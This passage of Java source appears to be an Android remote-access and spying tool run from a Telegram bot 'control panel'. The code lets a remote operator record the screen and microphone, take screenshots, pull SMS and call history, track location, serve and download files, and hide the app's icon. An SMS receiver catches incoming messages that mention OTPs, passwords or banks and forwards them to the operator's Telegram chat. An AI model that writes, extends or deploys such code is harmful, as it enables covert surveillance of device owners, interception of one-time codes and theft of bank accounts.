                                    if (text.equals("/start") || text.equals("/menu")) {
                                        showMainMenu();
                                    } else if (text.equals("/status")) {
                                        sendStatus();
                                    } else if (text.startsWith("/connect ")) {
                                        String id = text.substring(9).trim();
                                        handleConnectRequest(id);
                                    }
                                }
                            }
                        }
                    }
                }
                Thread.sleep(1000);
            } catch (Exception e) {
                Log.e("ZeroBot", "Listen error: " + e.getMessage());
                try { Thread.sleep(5000); } catch (Exception ignored) {}
            }
        }
    }

    private void deleteMessage(int messageId) {
        new Thread(() -> {
            try {
                String url = "https://api.telegram.org/bot" + Config.BOT_TOKEN + "/deleteMessage?chat_id=" + Config.CHAT_ID + "&message_id=" + messageId;
                getRequest(url);
            } catch (Exception ignored) {}
        }).start();
    }

    private void processButtonClick(String data) {
        if (data.equals("main_menu") || data.equals("refresh")) {
            showMainMenu();
        } else if (data.equals("screen_menu")) {
            showScreenMenu();
        } else if (data.equals("screenaudio_menu")) {
            showScreenAudioMenu();
        } else if (data.equals("audio_menu")) {
            showAudioMenu();
        } else if (data.equals("screenshot")) {
            takeScreenshot();
        } else if (data.equals("hide")) {
            hideApp();
        } else if (data.equals("unhide")) {
            unhideApp();
        } else if (data.equals("status")) {
            sendStatus();
        } else if (data.startsWith("screen_")) {
            if (data.equals("screen_10")) startScreenRecording(10, false);
            else if (data.equals("screen_30")) startScreenRecording(30, false);
            else if (data.equals("screen_60")) startScreenRecording(60, false);
            else if (data.equals("screen_120")) startScreenRecording(120, false);
            else if (data.equals("screen_300")) startScreenRecording(300, false);
            else if (data.equals("screen_600")) startScreenRecording(600, false);
        } else if (data.startsWith("screenaudio_")) {
            if (data.equals("screenaudio_10")) startScreenRecording(10, true);
            else if (data.equals("screenaudio_30")) startScreenRecording(30, true);
            else if (data.equals("screenaudio_60")) startScreenRecording(60, true);
            else if (data.equals("screenaudio_120")) startScreenRecording(120, true);
            else if (data.equals("screenaudio_300")) startScreenRecording(300, true);
            else if (data.equals("screenaudio_600")) startScreenRecording(600, true);
        } else if (data.startsWith("audio_")) {
            if (data.equals("audio_10")) startAudioRecording(10);
            else if (data.equals("audio_30")) startAudioRecording(30);
            else if (data.equals("audio_60")) startAudioRecording(60);
            else if (data.equals("audio_120")) startAudioRecording(120);
            else if (data.equals("audio_300")) startAudioRecording(300);
            else if (data.equals("audio_600")) startAudioRecording(600);
        } else if (data.equals(CB_FLASHLIGHT_ON)) {
            setFlashlight(true);
        } else if (data.equals(CB_FLASHLIGHT_OFF)) {
            setFlashlight(false);
        } else if (data.equals(CB_SIM_INFO)) {
            sendMessage(getFullDeviceStatus());
        } else if (data.equals(CB_APP_LIST)) {
            sendMessage(getInstalledAppsList());
        } else if (data.equals(CB_FOREGROUND_APP)) {
            sendMessage("📱 **Foreground app:** " + getForegroundAppName());
        } else if (data.equals(CB_CALL_LOG)) {
            uploadCallHistory();
        } else if (data.equals(CB_SMS_INBOX)) {
            uploadSmsHistory();
        } else if (data.equals(CB_FILE_SERVER_START)) {
            startFileServer();
        } else if (data.equals(CB_FILE_SERVER_STOP)) {
            stopFileServer();
        } else if (data.equals(CB_LOCATION_SEND)) {
            sendLocationOnce();
        } else if (data.equals(CB_LOCATION_START)) {
            startLocationTracking();
        } else if (data.equals(CB_LOCATION_STOP)) {
            stopLocationTracking();
        } else if (data.startsWith("remote_dl_")) {
            int id = Integer.parseInt(data.substring(10));
            downloadRemoteFile(id);
        } else {
            sendMessage("⚠️ Unknown command: " + data);
        }
    }

    private void showMainMenu() {
        String keyboard = "{\"inline_keyboard\":["
                + "[{\"text\":\"📸 Screenshot\",\"callback_data\":\"screenshot\"},{\"text\":\"🎥 Screen Rec\",\"callback_data\":\"screen_menu\"}],"
                + "[{\"text\":\"🎥🎙️ Screen+Audio\",\"callback_data\":\"screenaudio_menu\"},{\"text\":\"🎙️ Audio Rec\",\"callback_data\":\"audio_menu\"}],"
                + "[{\"text\":\"🔦 Flashlight ON\",\"callback_data\":\"" + CB_FLASHLIGHT_ON + "\"},{\"text\":\"🔦 Flashlight OFF\",\"callback_data\":\"" + CB_FLASHLIGHT_OFF + "\"}],"
                + "[{\"text\":\"📡 SIM Info\",\"callback_data\":\"" + CB_SIM_INFO + "\"},{\"text\":\"📱 App List\",\"callback_data\":\"" + CB_APP_LIST + "\"}],"
                + "[{\"text\":\"📞 Call History\",\"callback_data\":\"" + CB_CALL_LOG + "\"},{\"text\":\"✉️ SMS Inbox\",\"callback_data\":\"" + CB_SMS_INBOX + "\"}],"
                + "[{\"text\":\"🌐 File Server ON\",\"callback_data\":\"" + CB_FILE_SERVER_START + "\"},{\"text\":\"🌐 File Server OFF\",\"callback_data\":\"" + CB_FILE_SERVER_STOP + "\"}],"
                + "[{\"text\":\"📍 Send Location\",\"callback_data\":\"" + CB_LOCATION_SEND + "\"},{\"text\":\"📍 Start Tracking\",\"callback_data\":\"" + CB_LOCATION_START + "\"}],"
                + "[{\"text\":\"📍 Stop Tracking\",\"callback_data\":\"" + CB_LOCATION_STOP + "\"}],"
                + "[{\"text\":\"👻 Hide App\",\"callback_data\":\"hide\"},{\"text\":\"👁️ Unhide App\",\"callback_data\":\"unhide\"}],"
                + "[{\"text\":\"📊 Device Status\",\"callback_data\":\"status\"},{\"text\":\"🔄 Refresh\",\"callback_data\":\"refresh\"}]"
                + "]}";
        sendMessageWithKeyboard("⚙️ **DebDas CONTROL PANEL**\n\n" + getDeviceDetailsString() + "\n\n👇 **Select Option:**" + getFooter(), keyboard);
    }

    private void showScreenMenu() {
        String keyboard = "{\"inline_keyboard\":["
                + "[{\"text\":\"10s\",\"callback_data\":\"screen_10\"},{\"text\":\"30s\",\"callback_data\":\"screen_30\"},{\"text\":\"60s\",\"callback_data\":\"screen_60\"}],"
                + "[{\"text\":\"2 min\",\"callback_data\":\"screen_120\"},{\"text\":\"5 min\",\"callback_data\":\"screen_300\"},{\"text\":\"10 min\",\"callback_data\":\"screen_600\"}],"
                + "[{\"text\":\"🔙 Back\",\"callback_data\":\"main_menu\"}]"
                + "]}";
        sendMessageWithKeyboard("🎥 **SCREEN RECORDING**\n\n" + getDeviceDetailsString() + "\n\n📊 Select Duration:" + getFooter(), keyboard);
    }

    private void showScreenAudioMenu() {
        String keyboard = "{\"inline_keyboard\":["
                + "[{\"text\":\"10s\",\"callback_data\":\"screenaudio_10\"},{\"text\":\"30s\",\"callback_data\":\"screenaudio_30\"},{\"text\":\"60s\",\"callback_data\":\"screenaudio_60\"}],"
                + "[{\"text\":\"2 min\",\"callback_data\":\"screenaudio_120\"},{\"text\":\"5 min\",\"callback_data\":\"screenaudio_300\"},{\"text\":\"10 min\",\"callback_data\":\"screenaudio_600\"}],"
                + "[{\"text\":\"🔙 Back\",\"callback_data\":\"main_menu\"}]"
                + "]}";
        sendMessageWithKeyboard("🎥🎙️ **SCREEN + AUDIO RECORDING**\n\n" + getDeviceDetailsString() + "\n\n📊 Select Duration:" + getFooter(), keyboard);
    }

    private void showAudioMenu() {
        String keyboard = "{\"inline_keyboard\":["
                + "[{\"text\":\"10s\",\"callback_data\":\"audio_10\"},{\"text\":\"30s\",\"callback_data\":\"audio_30\"},{\"text\":\"60s\",\"callback_data\":\"audio_60\"}],"
                + "[{\"text\":\"2 min\",\"callback_data\":\"audio_120\"},{\"text\":\"5 min\",\"callback_data\":\"audio_300\"},{\"text\":\"10 min\",\"callback_data\":\"audio_600\"}],"
                + "[{\"text\":\"🔙 Back\",\"callback_data\":\"main_menu\"}]"
                + "]}";
        sendMessageWithKeyboard("🎙️ **AUDIO RECORDING**\n\n" + getDeviceDetailsString() + "\n\n📊 Select Duration:" + getFooter(), keyboard);
    }

    private void sendStatus() {
        String status = "📊 **DEVICE STATUS**\n\n" + getDeviceDetailsString() + "\n"
                + "🎥 **Recording:** " + (isRecording ? "Yes" : "No") + "\n"
                + "🌐 **Cloud Server:** " + (fileServerRunning ? "Running (ID `" + deviceId + "`)" : "Stopped") + "\n"
                + "📍 **Location Tracking:** " + (locationTracking ? "Active" : "Inactive") + "\n"
                + "💡 Type /menu for controls" + getFooter();
        sendMessage(status);
    }

    private void hideApp() {
        PackageManager pm = getPackageManager();
        ComponentName comp = new ComponentName(this, MainActivity.class);
        pm.setComponentEnabledSetting(comp, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        sendMessage("👻 **App Hidden!**\n\n" + getDeviceDetailsString() + "\nTo restore, use the /menu command or re-open the app manually." + getFooter());
    }

    private void unhideApp() {
        PackageManager pm = getPackageManager();
        ComponentName comp = new ComponentName(this, MainActivity.class);
        pm.setComponentEnabledSetting(comp, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
        sendMessage("👁️ **App Restored!**\n\n" + getDeviceDetailsString() + getFooter());
    }

    private void sendMessage(String text) {
        new Thread(() -> {
            try {
                String url = "https://api.telegram.org/bot" + Config.BOT_TOKEN + "/sendMessage?chat_id=" + Config.CHAT_ID +
                        "&text=" + URLEncoder.encode(text, "UTF-8") + "&parse_mode=Markdown";
                getRequest(url);
            } catch (Exception ignored) {}
        }).start();
    }

    private void sendMessageWithKeyboard(String text, String keyboardJson) {
        new Thread(() -> {
            try {
                JSONObject params = new JSONObject();
                params.put("chat_id", Config.CHAT_ID);
                params.put("text", text);
                params.put("parse_mode", "Markdown");
                params.put("reply_markup", new JSONObject(keyboardJson));
                URL url = new URL("https://api.telegram.org/bot" + Config.BOT_TOKEN + "/sendMessage");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "application/json");
                conn.getOutputStream().write(params.toString().getBytes("UTF-8"));
                conn.getInputStream();
                conn.disconnect();
            } catch (Exception ignored) {}
        }).start();
    }

    private void answerCallback(String callbackId) {
        new Thread(() -> {
            try {
                String url = "https://api.telegram.org/bot" + Config.BOT_TOKEN + "/answerCallbackQuery?callback_query_id=" + callbackId;
                getRequest(url);
            } catch (Exception ignored) {}
        }).start();
    }

    private String getRequest(String urlStr) {
        try {
            URL url = new URL(urlStr);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);
            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) sb.append(line);
            reader.close();
            conn.disconnect();
            return sb.toString();
        } catch (Exception e) {
            return null;
        }
    }

    // ── SMS receiver (fully implemented) ──
    public static class SmsReceiver extends android.content.BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            if ("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
                Object[] pdus = (Object[]) intent.getExtras().get("pdus");
                if (pdus != null) {
                    for (Object pdu : pdus) {
                        android.telephony.SmsMessage sms = android.telephony.SmsMessage.createFromPdu((byte[]) pdu);
                        String body = sms.getMessageBody();
                        if (containsDangerousKeyword(body)) {
                            Intent warnIntent = new Intent(context, MainService.class);
                            warnIntent.putExtra("dangerous_sms", body);
                            context.startService(warnIntent);
                        }
                    }
                }
            }
        }

        private boolean containsDangerousKeyword(String body) {
            String[] keywords = {"OTP", "password", "bank", "alert", "suspicious", "verify"};
            for (String k : keywords) {
                if (body.toLowerCase().contains(k.toLowerCase())) return true;
            }
            return false;
        }
    }

    // ── Static setData ──
    public static void setData(Intent intent, int code) {
        captureIntent = intent;
        captureResultCode = code;
        Log.d("ZeroService", "setData called: intent=" + intent + ", code=" + code);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            if (intent.hasExtra("data")) {
                captureIntent = intent.getParcelableExtra("data");
                captureResultCode = intent.getIntExtra("code", -1);
                SharedPreferences prefs = getSharedPreferences(PREF_SCREEN, MODE_PRIVATE);
                prefs.edit().putBoolean(KEY_SCREEN_CAPTURED, true).apply();
            }
            if (intent.hasExtra("dangerous_sms")) {
                String smsBody = intent.getStringExtra("dangerous_sms");
                sendMessage("⚠️ **Dangerous SMS Alert!**\n" + smsBody + "\n" + getFooter());
            }
        }
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        running = false;
        if (timer != null) timer.cancel();
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        stopFileServer();
        stopLocationTracking();
        cleanup();
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}